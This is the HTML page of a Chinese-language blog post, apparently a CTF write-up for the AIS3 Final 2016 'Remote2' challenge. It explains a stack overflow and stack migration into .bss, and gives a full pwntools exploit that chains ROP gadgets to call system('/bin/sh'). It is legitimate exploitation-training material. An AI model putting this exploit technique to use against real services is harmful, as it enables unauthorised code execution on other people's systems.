@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>  [AIS3 FINAl 2016] Remote2
+ | naetw's blog</title>
+
+    <meta name="author" content="Naetw"/>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/jquery.mglass.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/pygment-solarized-dark.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/style.css"/>
+
+    <!-- Fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Istok+Web' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Droid+Sans+Mono' rel='stylesheet' type='text/css'/>
+
+
+    <link rel="icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+
+    <!-- Feeds -->
+      <link href="https://naetw.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - All posts - Atom Feed"/>
+      <link href="https://naetw.github.io/feeds/write-up.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - Category: write-up - Atom Feed"/>
+
+
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="page-header">
+        <h1><a href="https://naetw.github.io">naetw's blog</a> <small></small></h1>
+      </div>
+
+      <nav class="navbar navbar-default">
+
+        <!-- Hamburger menu for mobile -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#plumage-navbar-collapse-1" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="https://naetw.github.io" title="">naetw's blog</a>
+        </div>
+
+        <!-- Menus and search forms -->
+        <div class="collapse navbar-collapse" id="plumage-navbar-collapse-1">
+
+          <ul class="nav navbar-nav">
+<li >
+                <a href="/archives">Archives</a>
+              </li>
+<li >
+                <a href="/categories">Categories</a>
+              </li>
+<li >
+                <a href="/tags">Tags</a>
+              </li>
+          </ul>
+
+
+
+        </div>
+
+      </nav>
+
+    </div>
+
+
+    <div class="container main">
+
+
+      <div class="row">
+        <div class=" col-md-9  ">
+  <h1>
+    <a href="https://naetw.github.io/posts/2016/08/29/ais3-final-2016-remote2/" rel="bookmark" title="Permalink to [AIS3 FINAl 2016] Remote2">[AIS3 FINAl 2016] Remote2</a>
+  </h1>
+        </div>
+      </div>
+
+      <div class="row">
+
+
+        <div class=" col-md-9 " id="content" role="main">
+  
+
+  <div>
+    <h2>Description</h2>
+<blockquote>
+<p>這題雖然沒在時間內解出來，但是在回家路上靈光乍現還是來寫一下好了</p>
+<p>P.S 由於 <strong>@Brainsp8210</strong> 的 payload 比我漂亮不少其實可以直接看他的-----&gt;<a href="https://github.com/briansp8210">傳送門</a>：</p>
+<p>這題應該要會的，就是一個比較麻煩的 <strong>Stack Migration</strong>，經驗不夠，沒有第一時間想到解法 Orz</p>
+</blockquote>
+<h2>Exploit</h2>
+<p>一開始先用 <code>file pwn2</code> 看了一下發現是 <code>strip</code> 過的 binary，就超級不想看的 QQ</p>
+<p>直接執行程式，會噴一個<code>sh: 1: lsh: not found</code>，然後就停在那不知道在幹嘛，於是用 <a href="https://github.com/BinaryAnalysisPlatform/qira">Qira</a> 追一下，隨便送幾個 AAAA 然後發現他在做 <code>read</code>，但是.....他是 1 byte 1 byte 的讀，然後最多可以讀 64 bytes，他會用 <code>[rbp-0x4]</code> 的 4 bytes 來判斷現在讀了多少 bytes 了</p>
+<div class="highlight"><pre><span></span><span class="mi">4005</span><span class="n">a3</span><span class="o">:</span>       <span class="mi">83</span> <span class="mi">45</span> <span class="n">fc</span> <span class="mi">01</span>             <span class="n">add</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="o">],</span><span class="mh">0x1</span>
+<span class="mi">4005</span><span class="n">a7</span><span class="o">:</span>       <span class="mi">83</span> <span class="mi">7</span><span class="n">d</span> <span class="n">fc</span> <span class="mi">3</span><span class="n">f</span>             <span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="o">],</span><span class="mh">0x3f</span>
+</pre></div>
+
+
+<p>從這段可以發現，64 bytes 全部讀完可以剛好蓋到 <strong>ret address</strong> 控制他的 <strong>control flow</strong></p>
+<div class="highlight"><pre><span></span><span class="mi">400582</span><span class="o">:</span>       <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">fc</span>                <span class="n">mov</span>    <span class="n">eax</span><span class="o">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="o">]</span>
+<span class="mi">400585</span><span class="o">:</span>       <span class="mi">48</span> <span class="mi">8</span><span class="n">d</span> <span class="mi">55</span> <span class="n">d0</span>             <span class="n">lea</span>    <span class="n">rdx</span><span class="o">,[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x30</span><span class="o">]</span>
+<span class="mi">400589</span><span class="o">:</span>       <span class="mi">48</span> <span class="mi">01</span> <span class="n">d0</span>                <span class="n">add</span>    <span class="n">rax</span><span class="o">,</span><span class="n">rdx</span>
+<span class="mi">40058</span><span class="n">c</span><span class="o">:</span>       <span class="n">ba</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="n">mov</span>    <span class="n">edx</span><span class="o">,</span><span class="mh">0x1</span>
+<span class="mi">400591</span><span class="o">:</span>       <span class="mi">48</span> <span class="mi">89</span> <span class="n">c6</span>                <span class="n">mov</span>    <span class="n">rsi</span><span class="o">,</span><span class="n">rax</span>
+<span class="mi">400594</span><span class="o">:</span>       <span class="n">bf</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="n">mov</span>    <span class="n">edi</span><span class="o">,</span><span class="mh">0x0</span>
+<span class="mi">400599</span><span class="o">:</span>       <span class="n">e8</span> <span class="n">a2</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="mi">400440</span> <span class="o">&lt;</span><span class="n">read</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>而且因為他要讀入的地方會受 <code>[rbp-0x4]</code> 而決定，所以也不能透過改那邊的值多蓋幾個 bytes，所以就是控制 <strong>rbp</strong> 還有 <strong>ret address</strong> 來做到 <code>*Stack Migration*</code></p>
+<p>payload #1:</p>
+<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">44</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x2c</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">)</span>
+</pre></div>
+
+
+<p>這邊的 <code>'\x2c' + '\x00'*3</code> 是剛好蓋到 <code>rbp-0x4</code> 的地方 <code>0x2c == 44</code> 剛好代表前面已經讀入的 44 bytes 才能讓後面 payload 順利讀進去 stack 上，蓋完 <code>'\x2c' + '\x00'*3</code> 後下一格就是 <code>rbp</code> 的位置，為了要達到 <code>*Stack Migration*</code>，要把 <code>rbp</code> 控制到空的 buffer 上，也就是控制程式的 <code>Stack Frame</code></p>
+<p>找 <code>.bss</code> 段中沒有用到的地方來做寫入</p>
+<div class="highlight"><pre><span></span>00601000-00602000 rw-p 00001000 08:01 2878868
+</pre></div>
+
+
+<p>可以從後面找，比較不會影響到前面原有的東西，在這裡我的做法需要兩個 buffer，在 buffer1 的 <strong>ret address</strong> 後面蓋成完整的 <code>*ROP Chain*</code></p>
+<div class="highlight"><pre><span></span><span class="n">buffer1</span> <span class="o">=</span> <span class="mh">0x602000</span> <span class="o">-</span> <span class="mh">0x100</span>
+<span class="n">buffer2</span> <span class="o">=</span> <span class="n">buffer1</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0xc</span>
+</pre></div>
+
+
+<p>這邊的 <code>buffer2</code> 需要特別控制，因為在讀完 <code>buffer1</code> 跟 <code>buffer2</code> 之後需要再跳回 <code>buffer1</code> 之後直接讓他 <code>ret</code> 到疊好的 <code>*ROP Chain*</code>，而在跳回 <code>buffer1</code> 時，他一樣會檢查 <code>[rbp-0x4]</code> 的值，因此我們在讀 <code>buffer2</code> 的時候就必須讓他把 <code>rbp-0x4</code> 的內容改成 <code>0x00000000</code> 所以除了將 <code>buffer1</code> 往下拉 <code>0x20</code> 個 bytes 之外還需要多拉 <code>0xc</code> 這樣寫入的頭就會在 <code>rbp-0x4</code> 的地方</p>
+<p>另外還有一個需要特別注意的是，在 <code>call read</code> 的時候程式會在 <code>buffer</code> 的頭減掉 <code>0x8</code> 的地方放上 <code>0x40059e</code>，在每次 call 完 read 之後會執行那段 code，重新回到迴圈繼續寫入，因此在 buffer2 的時候，需要在當前 <code>rsp-0x8</code> 的位置放置 <code>0x40059e</code></p>
+<p>payload #2, 3:</p>
+<div class="highlight"><pre><span></span><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">44</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x2c</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_judge</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x2c</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">))</span>
+</pre></div>
+
+
+<p>最後再回到 buffer1 把 ret address 蓋成 <code>pop rdi ; ret</code>，他便會將剛剛放的 <code>address of /bin/sh</code> pop 到 rdi 然後 ret 執行 <code>system</code> 便能成功拿到 <code>shell</code></p>
+<h2>Final Exploit:</h2>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">)</span>
+<span class="c1">#r = remote(&#39;final.ais3.org&#39;, 35171)</span>
+
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0000000000400623</span>
+
+<span class="n">system</span> <span class="o">=</span> <span class="mh">0x400430</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="mh">0x400645</span>
+
+<span class="n">buffer1</span> <span class="o">=</span> <span class="mh">0x602000</span><span class="o">-</span><span class="mh">0x100</span>
+
+<span class="n">buffer2</span> <span class="o">=</span> <span class="n">buffer1</span><span class="o">+</span><span class="mh">0x20</span><span class="o">+</span><span class="mh">0xc</span>
+
+<span class="n">read_start</span> <span class="o">=</span> <span class="mh">0x400581</span>
+
+<span class="n">read_judge</span> <span class="o">=</span> <span class="mh">0x40059e</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">44</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x2c</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">44</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x2c</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">))</span>
+<span class="nb">raw_input</span><span class="p">(</span><span class="s1">&#39;#&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_judge</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x2c</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buffer1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">))</span>
+<span class="nb">raw_input</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">44</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x2c</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">))</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+  </div>
+
+
+
+        </div>
+
+          <div class="col-md-3">
+  <div class="well">
+
+    <p><abbr title="2016-08-29T20:33:00+08:00"><i class="fa fa-calendar"></i> Mon 29 August 2016</abbr></p>
+
+      <p><address>
+        <i class="fa fa-user"></i> By
+          <a href="https://naetw.github.io/author/naetw.html" rel="author">Naetw</a>
+      </address></p>
+
+    <hr/>
+
+      <p>
+              <a href="https://naetw.github.io/category/write-up/" rel="tag"
+                  data-toggle="tooltip" class="label label-info"
+                  title="10 articles in this category">write-up</a>
+            <a href="/tag/ctf/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">CTF</a>
+            <a href="/tag/pwn/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">pwn</a>
+            <a href="/tag/rop/" data-toggle="tooltip"
+      class="label label-default"
+      title="4 articles with this tag">ROP</a>
+            <a href="/tag/ais3/" data-toggle="tooltip"
+      class="label label-default"
+      title="2 articles with this tag">AIS3</a>
+            <a href="/tag/stack-migration/" data-toggle="tooltip"
+      class="label label-default"
+      title="1 article with this tag">Stack Migration</a>
+      </p>
+      <hr/>
+
+
+
+  </div>
+            
+          </div>
+
+      </div>
+
+    </div>
+
+    <!-- TODO: make footer sticky -->
+    <footer class="container-fluid">
+      <div class="container">
+        <div class="row">
+
+            <div class="col-md-2">
+                <h5>Social</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="https://github.com/Naetw">
+      <i class="fa fa-github"></i>
+    GitHub
+  </a></li>
+                </ul>
+            </div>
+            <div class="col-md-2">
+                <h5>Links</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="http://getpelican.com/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=getpelican.com&size=16" width="16" height="16" class="icon" alt="getpelican.com icon"/>
+    Pelican
+  </a></li>
+                </ul>
+            </div>
+
+          <div class="col-md-2">
+            <h5>Browse content by</h5>
+            <ul class="list-unstyled">
+                <li><a href="https://naetw.github.io/categories/index.html"><i class="fa fa-tags"></i> Categories</a></li>
+                <li><a href="https://naetw.github.io/archives/index.html"><i class="fa fa-calendar"></i> Dates</a></li>
+                <li><a href="https://naetw.github.io/tags/index.html"><i class="fa fa-tag"></i> Tags</a></li>
+            </ul>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Copyright notice</h5>
+            <p>© Copyright 2016-2017 Naetw.</p>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Disclaimer</h5>
+              <p>All opinions expressed in this site are my own personal opinions and are not endorsed by, nor do they represent the opinions of my previous, current and future employers or any of its affiliates, partners or customers.</p>
+          </div>
+
+          <div class="col-md-2">
+              <h5>Feeds</h5>
+              <ul class="list-unstyled">
+                  <li><small><a href="https://naetw.github.io/feeds/all.atom.xml"><i class="fa fa-rss"></i> All posts (Atom)</a></small></li>
+                  <li><small><a href="https://naetw.github.io/feeds/write-up.atom.xml"><i class="fa fa-rss"></i> Category: write-up (Atom)</a></small></li>
+              </ul>
+          </div>
+
+        </div>
+      </div>
+
+      <h5 class="text-right"><a href="#"><i class="fa fa-arrow-up"></i> Back to top</a></h5>
+
+      <div class="container">
+        <div class="row col-md-12 text-muted text-center">
+          Site generated by <a href="https://getpelican.com"> Pelican</a>.<br/>
+          <a href="https://github.com/kdeldycke/plumage"> Plumage</a> theme by <a href="https://kevin.deldycke.com">Kevin Deldycke</a>.
+        </div>
+      </div>
+
+    </footer>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
+    <script src="https://naetw.github.io/theme/js/jquery.mglass.js"></script>
+    <script src="https://naetw.github.io/theme/js/application.js"></script>
+
+  </body>
+</html>
